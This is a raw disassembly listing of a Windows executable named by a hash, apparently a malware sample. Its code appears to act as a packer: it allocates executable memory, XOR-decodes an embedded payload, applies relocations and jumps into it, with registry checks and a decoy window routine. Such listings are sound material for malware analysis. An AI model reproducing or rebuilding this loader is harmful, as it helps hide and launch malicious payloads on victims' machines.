
cc0907bf508a8a82c0bbd462926738e533090a1287a396c8e6e9861a5d97f364.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xc
  401006:	mov    eax,DWORD PTR [ebp+0x8]
  401009:	mov    DWORD PTR [ebp-0x8],eax
  40100c:	mov    ecx,DWORD PTR [ebp+0xc]
  40100f:	mov    DWORD PTR [ebp-0xc],ecx
  401012:	mov    DWORD PTR [ebp-0x4],0x22b
  401019:	mov    edx,DWORD PTR [ebp-0x8]
  40101c:	cmp    edx,DWORD PTR [ebp-0xc]
  40101f:	jae    0x40102f
  401021:	mov    DWORD PTR [ebp-0x4],0x22b
  401028:	mov    eax,DWORD PTR [ebp-0x8]
  40102b:	jmp    0x401039
  40102d:	jmp    0x401039
  40102f:	mov    DWORD PTR [ebp-0x4],0x22b
  401036:	mov    eax,DWORD PTR [ebp-0xc]
  401039:	mov    esp,ebp
  40103b:	pop    ebp
  40103c:	ret    
  40103d:	int3   
  40103e:	int3   
  40103f:	int3   
  401040:	push   ebp
  401041:	mov    ebp,esp
  401043:	sub    esp,0xc
  401046:	mov    DWORD PTR [ebp-0x8],0x1e4dc
  40104d:	mov    DWORD PTR [ebp-0xc],0x3000
  401054:	mov    DWORD PTR [ebp-0x4],0x40
  40105b:	mov    eax,DWORD PTR [ebp-0x4]
  40105e:	push   eax
  40105f:	mov    ecx,DWORD PTR [ebp-0xc]
  401062:	push   ecx
  401063:	mov    edx,DWORD PTR [ebp+0x8]
  401066:	push   edx
  401067:	push   0x0
  401069:	push   0xffffffff
  40106b:	call   DWORD PTR ds:0x40313c
  401071:	mov    esp,ebp
  401073:	pop    ebp
  401074:	ret    
  401075:	int3   
  401076:	int3   
  401077:	int3   
  401078:	int3   
  401079:	int3   
  40107a:	int3   
  40107b:	int3   
  40107c:	int3   
  40107d:	int3   
  40107e:	int3   
  40107f:	int3   
  401080:	push   ebp
  401081:	mov    ebp,esp
  401083:	pop    ebp
  401084:	ret    
  401085:	int3   
  401086:	int3   
  401087:	int3   
  401088:	int3   
  401089:	int3   
  40108a:	int3   
  40108b:	int3   
  40108c:	int3   
  40108d:	int3   
  40108e:	int3   
  40108f:	int3   
  401090:	push   ebp
  401091:	mov    ebp,esp
  401093:	push   ecx
  401094:	mov    DWORD PTR [ebp-0x4],0x4
  40109b:	mov    eax,DWORD PTR [ebp-0x4]
  40109e:	add    eax,0x405000
  4010a3:	mov    ds:0x4032c4,eax
  4010a8:	mov    esp,ebp
  4010aa:	pop    ebp
  4010ab:	ret    
  4010ac:	int3   
  4010ad:	int3   
  4010ae:	int3   
  4010af:	int3   
  4010b0:	push   ebp
  4010b1:	mov    ebp,esp
  4010b3:	push   ecx
  4010b4:	mov    DWORD PTR [ebp-0x4],0x4
  4010bb:	mov    eax,DWORD PTR [ebp-0x4]
  4010be:	add    eax,0x41d81c
  4010c3:	mov    ds:0x4032c4,eax
  4010c8:	mov    esp,ebp
  4010ca:	pop    ebp
  4010cb:	ret    
  4010cc:	int3   
  4010cd:	int3   
  4010ce:	int3   
  4010cf:	int3   
  4010d0:	push   ebp
  4010d1:	mov    ebp,esp
  4010d3:	mov    eax,DWORD PTR [ebp+0x8]
  4010d6:	mov    eax,DWORD PTR [eax-0x4]
  4010d9:	pop    ebp
  4010da:	ret    
  4010db:	int3   
  4010dc:	int3   
  4010dd:	int3   
  4010de:	int3   
  4010df:	int3   
  4010e0:	push   ebp
  4010e1:	mov    ebp,esp
  4010e3:	mov    eax,DWORD PTR [ebp+0xc]
  4010e6:	mov    ecx,DWORD PTR [ebp+0x8]
  4010e9:	movzx  eax,WORD PTR [ecx+eax*2]
  4010ed:	pop    ebp
  4010ee:	ret    
  4010ef:	int3   
  4010f0:	push   ebp
  4010f1:	mov    ebp,esp
  4010f3:	sub    esp,0x30
  4010f6:	mov    DWORD PTR [ebp-0x8],0x11cb
  4010fd:	mov    DWORD PTR [ebp-0x10],0x0
  401104:	jmp    0x40110f
  401106:	mov    eax,DWORD PTR [ebp-0x10]
  401109:	add    eax,0x4
  40110c:	mov    DWORD PTR [ebp-0x10],eax
  40110f:	mov    ecx,DWORD PTR [ebp-0x10]
  401112:	cmp    ecx,DWORD PTR [ebp+0xc]
  401115:	jae    0x4011d6
  40111b:	mov    DWORD PTR [ebp-0x8],0x4189
  401122:	mov    edx,DWORD PTR [ebp-0x10]
  401125:	add    edx,0x563
  40112b:	mov    DWORD PTR [ebp-0x28],edx
  40112e:	mov    eax,DWORD PTR [ebp-0x28]
  401131:	mov    DWORD PTR [ebp-0x24],eax
  401134:	mov    ecx,DWORD PTR [ebp-0x24]
  401137:	mov    DWORD PTR [ebp-0x20],ecx
  40113a:	mov    edx,DWORD PTR [ebp-0x20]
  40113d:	mov    DWORD PTR [ebp-0x1c],edx
  401140:	cmp    DWORD PTR [ebp-0x10],0x0
  401144:	jne    0x401196
  401146:	push   0x104
  40114b:	push   0x4032c8
  401150:	call   DWORD PTR ds:0x403140
  401156:	push   0x403000
  40115b:	push   0x4032c8
  401160:	call   DWORD PTR ds:0x403144
  401166:	push   0x0
  401168:	push   0x80
  40116d:	push   0x3
  40116f:	push   0x0
  401171:	push   0x3
  401173:	push   0x1
  401175:	push   0x4032c8
  40117a:	call   DWORD PTR ds:0x403148
  401180:	mov    DWORD PTR [ebp-0x4],eax
  401183:	cmp    DWORD PTR [ebp-0x4],0xffffffff
  401187:	je     0x40118f
  401189:	cmp    DWORD PTR [ebp-0x4],0x0
  40118d:	jne    0x401196
  40118f:	mov    eax,0x42
  401194:	jmp    0x4011d6
  401196:	mov    eax,DWORD PTR [ebp-0x1c]
  401199:	mov    DWORD PTR [ebp-0x30],eax
  40119c:	mov    ecx,DWORD PTR [ebp-0x30]
  40119f:	mov    DWORD PTR [ebp-0x14],ecx
  4011a2:	mov    edx,DWORD PTR [ebp-0x10]
  4011a5:	mov    DWORD PTR [ebp-0x18],edx
  4011a8:	mov    eax,DWORD PTR [ebp+0x8]
  4011ab:	add    eax,DWORD PTR [ebp-0x10]
  4011ae:	mov    DWORD PTR [ebp-0x2c],eax
  4011b1:	mov    ecx,DWORD PTR [ebp-0x2c]
  4011b4:	mov    edx,DWORD PTR [ecx]
  4011b6:	add    edx,DWORD PTR [ebp-0x18]
  4011b9:	mov    eax,DWORD PTR [ebp-0x2c]
  4011bc:	mov    DWORD PTR [eax],edx
  4011be:	mov    ecx,DWORD PTR [ebp+0x8]
  4011c1:	add    ecx,DWORD PTR [ebp-0x10]
  4011c4:	mov    edx,DWORD PTR [ecx]
  4011c6:	xor    edx,DWORD PTR [ebp-0x14]
  4011c9:	mov    eax,DWORD PTR [ebp+0x8]
  4011cc:	add    eax,DWORD PTR [ebp-0x10]
  4011cf:	mov    DWORD PTR [eax],edx
  4011d1:	jmp    0x401106
  4011d6:	mov    esp,ebp
  4011d8:	pop    ebp
  4011d9:	ret    
  4011da:	int3   
  4011db:	int3   
  4011dc:	int3   
  4011dd:	int3   
  4011de:	int3   
  4011df:	int3   
  4011e0:	push   ebp
  4011e1:	mov    ebp,esp
  4011e3:	sub    esp,0x14
  4011e6:	mov    eax,DWORD PTR [ebp+0x8]
  4011e9:	cmp    DWORD PTR [eax+0x4],0x0
  4011ed:	je     0x401237
  4011ef:	mov    DWORD PTR [ebp-0x14],0x2a1
  4011f6:	mov    ecx,DWORD PTR [ebp+0x8]
  4011f9:	mov    edx,DWORD PTR [ecx+0x4]
  4011fc:	sub    edx,0x8
  4011ff:	shr    edx,1
  401201:	mov    DWORD PTR [ebp-0xc],edx
  401204:	mov    eax,DWORD PTR [ebp+0x8]
  401207:	add    eax,0x8
  40120a:	mov    DWORD PTR [ebp-0x10],eax
  40120d:	mov    ecx,DWORD PTR [ebp+0x8]
  401210:	push   ecx
  401211:	mov    edx,DWORD PTR [ebp+0x10]
  401214:	push   edx
  401215:	mov    eax,DWORD PTR [ebp+0xc]
  401218:	push   eax
  401219:	mov    ecx,DWORD PTR [ebp-0x10]
  40121c:	push   ecx
  40121d:	mov    edx,DWORD PTR [ebp-0xc]
  401220:	push   edx
  401221:	call   0x401240
  401226:	add    esp,0x14
  401229:	mov    eax,DWORD PTR [ebp+0x8]
  40122c:	mov    ecx,DWORD PTR [ebp+0x8]
  40122f:	add    ecx,DWORD PTR [eax+0x4]
  401232:	mov    DWORD PTR [ebp+0x8],ecx
  401235:	jmp    0x4011e6
  401237:	mov    esp,ebp
  401239:	pop    ebp
  40123a:	ret    
  40123b:	int3   
  40123c:	int3   
  40123d:	int3   
  40123e:	int3   
  40123f:	int3   
  401240:	push   ebp
  401241:	mov    ebp,esp
  401243:	sub    esp,0xc
  401246:	mov    DWORD PTR [ebp-0x4],0x0
  40124d:	jmp    0x401258
  40124f:	mov    eax,DWORD PTR [ebp-0x4]
  401252:	add    eax,0x1
  401255:	mov    DWORD PTR [ebp-0x4],eax
  401258:	mov    ecx,DWORD PTR [ebp-0x4]
  40125b:	cmp    ecx,DWORD PTR [ebp+0x8]
  40125e:	jae    0x4012c3
  401260:	mov    edx,DWORD PTR [ebp-0x4]
  401263:	push   edx
  401264:	mov    eax,DWORD PTR [ebp+0xc]
  401267:	push   eax
  401268:	call   0x4010e0
  40126d:	add    esp,0x8
  401270:	sar    eax,0xc
  401273:	cmp    eax,0x3
  401276:	jne    0x4012c1
  401278:	mov    DWORD PTR [ebp-0xc],0xfff
  40127f:	mov    ecx,DWORD PTR [ebp-0x4]
  401282:	push   ecx
  401283:	mov    edx,DWORD PTR [ebp+0xc]
  401286:	push   edx
  401287:	call   0x4010e0
  40128c:	add    esp,0x8
  40128f:	and    eax,DWORD PTR [ebp-0xc]
  401292:	add    eax,0x2d23
  401297:	mov    DWORD PTR [ebp-0x8],eax
  40129a:	mov    eax,DWORD PTR [ebp+0x18]
  40129d:	mov    ecx,DWORD PTR [ebp+0x10]
  4012a0:	add    ecx,DWORD PTR [eax]
  4012a2:	mov    edx,DWORD PTR [ebp-0x8]
  4012a5:	mov    eax,DWORD PTR [ecx+edx*1-0x2d23]
  4012ac:	add    eax,DWORD PTR [ebp+0x14]
  4012af:	mov    ecx,DWORD PTR [ebp+0x18]
  4012b2:	mov    edx,DWORD PTR [ebp+0x10]
  4012b5:	add    edx,DWORD PTR [ecx]
  4012b7:	mov    ecx,DWORD PTR [ebp-0x8]
  4012ba:	mov    DWORD PTR [edx+ecx*1-0x2d23],eax
  4012c1:	jmp    0x40124f
  4012c3:	mov    esp,ebp
  4012c5:	pop    ebp
  4012c6:	ret    
  4012c7:	int3   
  4012c8:	int3   
  4012c9:	int3   
  4012ca:	int3   
  4012cb:	int3   
  4012cc:	int3   
  4012cd:	int3   
  4012ce:	int3   
  4012cf:	int3   
  4012d0:	push   ebp
  4012d1:	mov    ebp,esp
  4012d3:	sub    esp,0x22c
  4012d9:	mov    DWORD PTR [ebp-0x220],0x7c
  4012e3:	mov    DWORD PTR [ebp-0x214],0x0
  4012ed:	mov    eax,ds:0x403140
  4012f2:	mov    DWORD PTR [ebp-0x4],eax
  4012f5:	push   0x104
  4012fa:	lea    ecx,[ebp-0x210]
  401300:	push   ecx
  401301:	call   DWORD PTR [ebp-0x4]
  401304:	mov    edx,DWORD PTR ds:0x403144
  40130a:	mov    DWORD PTR [ebp-0x224],edx
  401310:	mov    eax,ds:0x403148
  401315:	mov    DWORD PTR [ebp-0x218],eax
  40131b:	mov    DWORD PTR [ebp-0x228],0x0
  401325:	jmp    0x401336
  401327:	mov    ecx,DWORD PTR [ebp-0x228]
  40132d:	add    ecx,0x1
  401330:	mov    DWORD PTR [ebp-0x228],ecx
  401336:	mov    edx,DWORD PTR [ebp-0x228]
  40133c:	cmp    edx,DWORD PTR [ebp+0x10]
  40133f:	jge    0x40137a
  401341:	mov    eax,DWORD PTR [ebp+0xc]
  401344:	add    eax,DWORD PTR [ebp-0x228]
  40134a:	movzx  ecx,BYTE PTR [eax]
  40134d:	mov    DWORD PTR [ebp-0x22c],ecx
  401353:	mov    DWORD PTR [ebp-0x220],0x7c
  40135d:	mov    edx,DWORD PTR [ebp+0x8]
  401360:	add    edx,DWORD PTR [ebp-0x228]
  401366:	mov    al,BYTE PTR [ebp-0x22c]
  40136c:	mov    BYTE PTR [edx],al
  40136e:	mov    DWORD PTR [ebp-0x220],0x33
  401378:	jmp    0x401327
  40137a:	mov    esp,ebp
  40137c:	pop    ebp
  40137d:	ret    
  40137e:	int3   
  40137f:	int3   
  401380:	push   ebp
  401381:	mov    ebp,esp
  401383:	sub    esp,0x50
  401386:	mov    eax,DWORD PTR [ebp+0xc]
  401389:	mov    DWORD PTR [ebp-0x50],eax
  40138c:	cmp    DWORD PTR [ebp-0x50],0x200
  401393:	ja     0x4013b7
  401395:	cmp    DWORD PTR [ebp-0x50],0x200
  40139c:	je     0x4013f1
  40139e:	cmp    DWORD PTR [ebp-0x50],0x2
  4013a2:	je     0x40156b
  4013a8:	cmp    DWORD PTR [ebp-0x50],0xf
  4013ac:	je     0x4014ad
  4013b2:	jmp    0x401577
  4013b7:	cmp    DWORD PTR [ebp-0x50],0x201
  4013be:	je     0x4013d2
  4013c0:	cmp    DWORD PTR [ebp-0x50],0x202
  4013c7:	je     0x401498
  4013cd:	jmp    0x401577
  4013d2:	mov    DWORD PTR ds:0x4032b8,0x0
  4013dc:	push   0x1
  4013de:	push   0x0
  4013e0:	mov    ecx,DWORD PTR [ebp+0x8]
  4013e3:	push   ecx
  4013e4:	call   DWORD PTR ds:0x403150
  4013ea:	xor    eax,eax
  4013ec:	jmp    0x40158d
  4013f1:	mov    edx,DWORD PTR [ebp+0x10]
  4013f4:	and    edx,0x1
  4013f7:	je     0x401491
  4013fd:	cmp    DWORD PTR ds:0x4032b8,0x3e8
  401407:	jge    0x401491
  40140d:	mov    eax,DWORD PTR [ebp+0x14]
  401410:	and    eax,0xffff
  401415:	movzx  ecx,ax
  401418:	mov    edx,DWORD PTR ds:0x4032b8
  40141e:	mov    DWORD PTR [edx*8+0x4032bc],ecx
  401425:	mov    eax,DWORD PTR [ebp+0x14]
  401428:	shr    eax,0x10
  40142b:	and    eax,0xffff
  401430:	movzx  ecx,ax
  401433:	mov    edx,DWORD PTR ds:0x4032b8
  401439:	mov    DWORD PTR [edx*8+0x4032c0],ecx
  401440:	mov    eax,ds:0x4032b8
  401445:	add    eax,0x1
  401448:	mov    ds:0x4032b8,eax
  40144d:	mov    ecx,DWORD PTR [ebp+0x8]
  401450:	push   ecx
  401451:	call   DWORD PTR ds:0x403154
  401457:	mov    DWORD PTR [ebp-0x4c],eax
  40145a:	push   0x0
  40145c:	mov    edx,DWORD PTR [ebp+0x14]
  40145f:	shr    edx,0x10
  401462:	and    edx,0xffff
  401468:	movzx  eax,dx
  40146b:	push   eax
  40146c:	mov    ecx,DWORD PTR [ebp+0x14]
  40146f:	and    ecx,0xffff
  401475:	movzx  edx,cx
  401478:	push   edx
  401479:	mov    eax,DWORD PTR [ebp-0x4c]
  40147c:	push   eax
  40147d:	call   DWORD PTR ds:0x40317c
  401483:	mov    ecx,DWORD PTR [ebp-0x4c]
  401486:	push   ecx
  401487:	mov    edx,DWORD PTR [ebp+0x8]
  40148a:	push   edx
  40148b:	call   DWORD PTR ds:0x403158
  401491:	xor    eax,eax
  401493:	jmp    0x40158d
  401498:	push   0x0
  40149a:	push   0x0
  40149c:	mov    eax,DWORD PTR [ebp+0x8]
  40149f:	push   eax
  4014a0:	call   DWORD PTR ds:0x403150
  4014a6:	xor    eax,eax
  4014a8:	jmp    0x40158d
  4014ad:	lea    ecx,[ebp-0x40]
  4014b0:	push   ecx
  4014b1:	mov    edx,DWORD PTR [ebp+0x8]
  4014b4:	push   edx
  4014b5:	call   DWORD PTR ds:0x40315c
  4014bb:	mov    DWORD PTR [ebp-0x4c],eax
  4014be:	push   0x7f02
  4014c3:	push   0x0
  4014c5:	call   DWORD PTR ds:0x403160
  4014cb:	push   eax
  4014cc:	call   DWORD PTR ds:0x403164
  4014d2:	push   0x1
  4014d4:	call   DWORD PTR ds:0x403168
  4014da:	mov    DWORD PTR [ebp-0x44],0x0
  4014e1:	jmp    0x4014ec
  4014e3:	mov    eax,DWORD PTR [ebp-0x44]
  4014e6:	add    eax,0x1
  4014e9:	mov    DWORD PTR [ebp-0x44],eax
  4014ec:	mov    ecx,DWORD PTR ds:0x4032b8
  4014f2:	sub    ecx,0x1
  4014f5:	cmp    DWORD PTR [ebp-0x44],ecx
  4014f8:	jge    0x40153d
  4014fa:	mov    edx,DWORD PTR [ebp-0x44]
  4014fd:	add    edx,0x1
  401500:	mov    DWORD PTR [ebp-0x48],edx
  401503:	jmp    0x40150e
  401505:	mov    eax,DWORD PTR [ebp-0x48]
  401508:	add    eax,0x1
  40150b:	mov    DWORD PTR [ebp-0x48],eax
  40150e:	mov    ecx,DWORD PTR [ebp-0x48]
  401511:	cmp    ecx,DWORD PTR ds:0x4032b8
  401517:	jge    0x40153b
  401519:	mov    edx,DWORD PTR [ebp-0x48]
  40151c:	mov    eax,DWORD PTR [edx*8+0x4032c0]
  401523:	push   eax
  401524:	mov    ecx,DWORD PTR [ebp-0x48]
  401527:	mov    edx,DWORD PTR [ecx*8+0x4032bc]
  40152e:	push   edx
  40152f:	mov    eax,DWORD PTR [ebp-0x4c]
  401532:	push   eax
  401533:	call   DWORD PTR ds:0x403180
  401539:	jmp    0x401505
  40153b:	jmp    0x4014e3
  40153d:	push   0x0
  40153f:	call   DWORD PTR ds:0x403168
  401545:	push   0x7f00
  40154a:	push   0x0
  40154c:	call   DWORD PTR ds:0x403160
  401552:	push   eax
  401553:	call   DWORD PTR ds:0x403164
  401559:	lea    ecx,[ebp-0x40]
  40155c:	push   ecx
  40155d:	mov    edx,DWORD PTR [ebp+0x8]
  401560:	push   edx
  401561:	call   DWORD PTR ds:0x40316c
  401567:	xor    eax,eax
  401569:	jmp    0x40158d
  40156b:	push   0x0
  40156d:	call   DWORD PTR ds:0x403170
  401573:	xor    eax,eax
  401575:	jmp    0x40158d
  401577:	mov    eax,DWORD PTR [ebp+0x14]
  40157a:	push   eax
  40157b:	mov    ecx,DWORD PTR [ebp+0x10]
  40157e:	push   ecx
  40157f:	mov    edx,DWORD PTR [ebp+0xc]
  401582:	push   edx
  401583:	mov    eax,DWORD PTR [ebp+0x8]
  401586:	push   eax
  401587:	call   DWORD PTR ds:0x403174
  40158d:	mov    esp,ebp
  40158f:	pop    ebp
  401590:	ret    0x10
  401593:	int3   
  401594:	int3   
  401595:	int3   
  401596:	int3   
  401597:	int3   
  401598:	int3   
  401599:	int3   
  40159a:	int3   
  40159b:	int3   
  40159c:	int3   
  40159d:	int3   
  40159e:	int3   
  40159f:	int3   
  4015a0:	push   ebp
  4015a1:	mov    ebp,esp
  4015a3:	sub    esp,0x98
  4015a9:	mov    DWORD PTR ds:0x4033cc,ebp
  4015af:	pusha  
  4015b0:	mov    DWORD PTR [ebp-0x3c],0x0
  4015b7:	mov    DWORD PTR [ebp-0x50],0x80000002
  4015be:	mov    DWORD PTR [ebp-0x84],0x60
  4015c8:	mov    DWORD PTR [ebp-0x70],0x40302c
  4015cf:	mov    DWORD PTR [ebp-0x80],0x403038
  4015d6:	mov    DWORD PTR [ebp-0x68],0x3
  4015dd:	push   0x1
  4015df:	call   DWORD PTR ds:0x403168
  4015e5:	mov    DWORD PTR [ebp-0x84],0x42
  4015ef:	mov    eax,ds:0x403188
  4015f4:	mov    ds:0x4033d0,eax
  4015f9:	mov    DWORD PTR [ebp-0x84],0x6
  401603:	mov    ecx,DWORD PTR [ebp-0x70]
  401606:	mov    BYTE PTR [ecx+0x1],0x4f
  40160a:	lea    edx,[ebp-0x78]
  40160d:	push   edx
  40160e:	mov    eax,DWORD PTR [ebp-0x70]
  401611:	push   eax
  401612:	push   0x80000002
  401617:	call   DWORD PTR ds:0x4033d0
  40161d:	test   eax,eax
  40161f:	je     0x401628
  401621:	xor    eax,eax
  401623:	jmp    0x40190b
  401628:	mov    DWORD PTR [ebp-0x84],0x60
  401632:	lea    ecx,[ebp-0x78]
  401635:	push   ecx
  401636:	push   0x40303c
  40163b:	mov    edx,DWORD PTR [ebp-0x78]
  40163e:	push   edx
  40163f:	call   DWORD PTR ds:0x4033d0
  401645:	test   eax,eax
  401647:	je     0x401650
  401649:	xor    eax,eax
  40164b:	jmp    0x40190b
  401650:	lea    eax,[ebp-0x78]
  401653:	push   eax
  401654:	push   0x403044
  401659:	mov    ecx,DWORD PTR [ebp-0x78]
  40165c:	push   ecx
  40165d:	call   DWORD PTR ds:0x4033d0
  401663:	test   eax,eax
  401665:	je     0x40166e
  401667:	xor    eax,eax
  401669:	jmp    0x40190b
  40166e:	lea    edx,[ebp-0x78]
  401671:	push   edx
  401672:	push   0x403080
  401677:	mov    eax,DWORD PTR [ebp-0x78]
  40167a:	push   eax
  40167b:	call   DWORD PTR ds:0x4033d0
  401681:	test   eax,eax
  401683:	jne    0x40168c
  401685:	xor    eax,eax
  401687:	jmp    0x40190b
  40168c:	call   0x401090
  401691:	mov    DWORD PTR [ebp-0x34],0x64
  401698:	mov    DWORD PTR [ebp-0x1c],0xf
  40169f:	mov    DWORD PTR [ebp-0x3c],0x0
  4016a6:	mov    DWORD PTR [ebp-0x24],0x0
  4016ad:	mov    DWORD PTR [ebp-0x30],0x1
  4016b4:	mov    DWORD PTR [ebp-0x14],0x0
  4016bb:	mov    DWORD PTR [ebp-0x34],0x64
  4016c2:	mov    DWORD PTR [ebp-0x1c],0xf
  4016c9:	mov    DWORD PTR [ebp-0x3c],0x0
  4016d0:	mov    DWORD PTR [ebp-0x24],0x0
  4016d7:	mov    DWORD PTR [ebp-0x30],0x1
  4016de:	mov    DWORD PTR [ebp-0x18],0x3
  4016e5:	mov    DWORD PTR [ebp-0x14],0x0
  4016ec:	mov    DWORD PTR [ebp-0x34],0x64
  4016f3:	mov    DWORD PTR [ebp-0x1c],0xf
  4016fa:	mov    DWORD PTR [ebp-0x3c],0x0
  401701:	mov    DWORD PTR [ebp-0x24],0x0
  401708:	mov    DWORD PTR [ebp-0x30],0x1
  40170f:	mov    DWORD PTR [ebp-0x18],0x3
  401716:	mov    ecx,DWORD PTR ds:0x4032c4
  40171c:	push   ecx
  40171d:	call   0x4010d0
  401722:	add    esp,0x4
  401725:	mov    DWORD PTR [ebp-0x40],eax
  401728:	mov    edx,DWORD PTR [ebp-0x40]
  40172b:	push   edx
  40172c:	call   0x401040
  401731:	add    esp,0x4
  401734:	mov    DWORD PTR [ebp-0x38],eax
  401737:	mov    eax,DWORD PTR [ebp-0x40]
  40173a:	push   eax
  40173b:	push   0x0
  40173d:	mov    ecx,DWORD PTR [ebp-0x38]
  401740:	push   ecx
  401741:	call   0x401080
  401746:	add    esp,0xc
  401749:	mov    edx,DWORD PTR [ebp-0x40]
  40174c:	mov    DWORD PTR [ebp-0x48],edx
  40174f:	mov    eax,DWORD PTR [ebp-0x3c]
  401752:	cmp    eax,DWORD PTR [ebp-0x40]
  401755:	jae    0x4017a7
  401757:	mov    ecx,DWORD PTR [ebp-0x48]
  40175a:	push   ecx
  40175b:	mov    edx,DWORD PTR [ebp-0x34]
  40175e:	push   edx
  40175f:	call   0x401000
  401764:	add    esp,0x8
  401767:	mov    DWORD PTR [ebp-0x4c],eax
  40176a:	mov    eax,DWORD PTR [ebp-0x4c]
  40176d:	push   eax
  40176e:	mov    ecx,DWORD PTR ds:0x4032c4
  401774:	add    ecx,DWORD PTR [ebp-0x24]
  401777:	push   ecx
  401778:	mov    edx,DWORD PTR [ebp-0x38]
  40177b:	add    edx,DWORD PTR [ebp-0x3c]
  40177e:	push   edx
  40177f:	call   0x4012d0
  401784:	add    esp,0xc
  401787:	mov    eax,DWORD PTR [ebp-0x1c]
  40178a:	add    eax,DWORD PTR [ebp-0x34]
  40178d:	add    eax,DWORD PTR [ebp-0x24]
  401790:	mov    DWORD PTR [ebp-0x24],eax
  401793:	mov    ecx,DWORD PTR [ebp-0x3c]
  401796:	add    ecx,DWORD PTR [ebp-0x34]
  401799:	mov    DWORD PTR [ebp-0x3c],ecx
  40179c:	mov    edx,DWORD PTR [ebp-0x48]
  40179f:	sub    edx,DWORD PTR [ebp-0x4c]
  4017a2:	mov    DWORD PTR [ebp-0x48],edx
  4017a5:	jmp    0x40174f
  4017a7:	mov    eax,DWORD PTR [ebp-0x40]
  4017aa:	push   eax
  4017ab:	mov    ecx,DWORD PTR [ebp-0x38]
  4017ae:	push   ecx
  4017af:	call   0x4010f0
  4017b4:	add    esp,0x8
  4017b7:	mov    DWORD PTR [ebp-0x24],0x0
  4017be:	mov    DWORD PTR [ebp-0x88],0x0
  4017c8:	call   0x4010b0
  4017cd:	mov    edx,DWORD PTR ds:0x4032c4
  4017d3:	push   edx
  4017d4:	call   0x4010d0
  4017d9:	add    esp,0x4
  4017dc:	mov    DWORD PTR [ebp-0x8c],eax
  4017e2:	mov    eax,DWORD PTR [ebp-0x8c]
  4017e8:	push   eax
  4017e9:	call   0x401040
  4017ee:	add    esp,0x4
  4017f1:	mov    DWORD PTR [ebp-0x20],eax
  4017f4:	mov    ecx,DWORD PTR [ebp-0x8c]
  4017fa:	push   ecx
  4017fb:	push   0x0
  4017fd:	mov    edx,DWORD PTR [ebp-0x20]
  401800:	push   edx
  401801:	call   0x401080
  401806:	add    esp,0xc
  401809:	mov    eax,DWORD PTR [ebp-0x8c]
  40180f:	mov    DWORD PTR [ebp-0x94],eax
  401815:	mov    ecx,DWORD PTR [ebp-0x88]
  40181b:	cmp    ecx,DWORD PTR [ebp-0x8c]
  401821:	jae    0x40188e
  401823:	mov    edx,DWORD PTR [ebp-0x94]
  401829:	push   edx
  40182a:	mov    eax,DWORD PTR [ebp-0x34]
  40182d:	push   eax
  40182e:	call   0x401000
  401833:	add    esp,0x8
  401836:	mov    DWORD PTR [ebp-0x98],eax
  40183c:	mov    ecx,DWORD PTR [ebp-0x98]
  401842:	push   ecx
  401843:	mov    edx,DWORD PTR ds:0x4032c4
  401849:	add    edx,DWORD PTR [ebp-0x24]
  40184c:	push   edx
  40184d:	mov    eax,DWORD PTR [ebp-0x20]
  401850:	add    eax,DWORD PTR [ebp-0x88]
  401856:	push   eax
  401857:	call   0x4012d0
  40185c:	add    esp,0xc
  40185f:	mov    ecx,DWORD PTR [ebp-0x1c]
  401862:	add    ecx,DWORD PTR [ebp-0x34]
  401865:	add    ecx,DWORD PTR [ebp-0x24]
  401868:	mov    DWORD PTR [ebp-0x24],ecx
  40186b:	mov    edx,DWORD PTR [ebp-0x88]
  401871:	add    edx,DWORD PTR [ebp-0x34]
  401874:	mov    DWORD PTR [ebp-0x88],edx
  40187a:	mov    eax,DWORD PTR [ebp-0x94]
  401880:	sub    eax,DWORD PTR [ebp-0x98]
  401886:	mov    DWORD PTR [ebp-0x94],eax
  40188c:	jmp    0x401815
  40188e:	mov    ecx,DWORD PTR [ebp-0x8c]
  401894:	push   ecx
  401895:	mov    edx,DWORD PTR [ebp-0x20]
  401898:	push   edx
  401899:	call   0x4010f0
  40189e:	add    esp,0x8
  4018a1:	mov    eax,DWORD PTR [ebp-0x38]
  4018a4:	mov    ecx,DWORD PTR [ebp-0x20]
  4018a7:	mov    DWORD PTR [eax],ecx
  4018a9:	push   0x17000
  4018ae:	call   0x401040
  4018b3:	add    esp,0x4
  4018b6:	mov    DWORD PTR [ebp-0xc],eax
  4018b9:	push   0x15500
  4018be:	mov    edx,DWORD PTR [ebp-0x38]
  4018c1:	push   edx
  4018c2:	mov    eax,DWORD PTR [ebp-0xc]
  4018c5:	add    eax,0x200
  4018ca:	push   eax
  4018cb:	call   0x4012d0
  4018d0:	add    esp,0xc
  4018d3:	mov    ecx,DWORD PTR [ebp-0xc]
  4018d6:	sub    ecx,0x400000
  4018dc:	push   ecx
  4018dd:	mov    edx,DWORD PTR [ebp-0xc]
  4018e0:	push   edx
  4018e1:	mov    eax,DWORD PTR [ebp-0x20]
  4018e4:	push   eax
  4018e5:	call   0x4011e0
  4018ea:	add    esp,0xc
  4018ed:	mov    eax,ds:0x4033cc
  4018f2:	mov    ecx,eax
  4018f4:	xor    eax,eax
  4018f6:	je     0x4018f9
  4018f8:	ret    
  4018f9:	mov    esp,ecx
  4018fb:	pop    eax
  4018fc:	mov    eax,DWORD PTR [ebp-0xc]
  4018ff:	add    eax,0x15350
  401904:	mov    ds:0x4033d4,eax
  401909:	push   eax
  40190a:	ret    
  40190b:	mov    esp,ebp
  40190d:	pop    ebp
  40190e:	ret    
  40190f:	int3   
  401910:	push   ebp
  401911:	mov    ebp,esp
  401913:	pop    eax
  401914:	mov    ecx,DWORD PTR ds:0x4033d4
  40191a:	push   ecx
  40191b:	ret    
  40191c:	pop    ebp
  40191d:	ret    
  40191e:	jmp    DWORD PTR ds:0x40313c
  401924:	jmp    DWORD PTR ds:0x403140
  40192a:	jmp    DWORD PTR ds:0x403144
  401930:	jmp    DWORD PTR ds:0x403148
  401936:	jmp    DWORD PTR ds:0x403150
  40193c:	jmp    DWORD PTR ds:0x403154
  401942:	jmp    DWORD PTR ds:0x403158
  401948:	jmp    DWORD PTR ds:0x40315c
  40194e:	jmp    DWORD PTR ds:0x403160
  401954:	jmp    DWORD PTR ds:0x403164
  40195a:	jmp    DWORD PTR ds:0x403168
  401960:	jmp    DWORD PTR ds:0x40316c
  401966:	jmp    DWORD PTR ds:0x403170
  40196c:	jmp    DWORD PTR ds:0x403174
  401972:	jmp    DWORD PTR ds:0x40317c
  401978:	jmp    DWORD PTR ds:0x403180
  40197e:	jmp    DWORD PTR ds:0x403188

Disassembly of section .z3:

00404000 <.z3>:
  404000:	add    BYTE PTR [eax],al
	...

Disassembly of section .z:

00405000 <.z>:
